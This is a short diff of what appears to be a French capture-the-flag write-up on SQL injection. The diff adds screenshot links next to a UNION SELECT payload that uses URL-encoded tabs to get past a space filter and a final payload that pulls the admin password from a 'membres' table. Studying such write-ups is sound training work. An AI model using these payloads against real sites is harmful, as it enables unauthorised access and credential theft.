@@ -31,8 +31,15 @@ Indice du code source : la table a 4 colonnes.
      Version adaptée :
     0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)%09AS%09A%09JOIN%09(SELECT%092)%09AS%09B%09JOIN%09(SELECT%093)%09AS%09C%09JOIN%09(SELECT%094)%09AS%09D
 
+
+![image](https://github.com/user-attachments/assets/718813e2-dffd-4d68-8c11-0f9e1a20fb62)
+
+
+
      Payload final pour récupérer le mot de passe admin :
     0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)%09AS%09A%09JOIN%09(SELECT%092)%09AS%09B%09JOIN%09(SELECT%093)%09AS%09C%09JOIN%09(SELECT%09pass%09From%09membres%09LIMIT%091%09OFFSET%090%09)%09AS%09D
+
+![image](https://github.com/user-attachments/assets/3c3be7cf-6dd8-407c-9d02-223343e206f6)
 
 
 
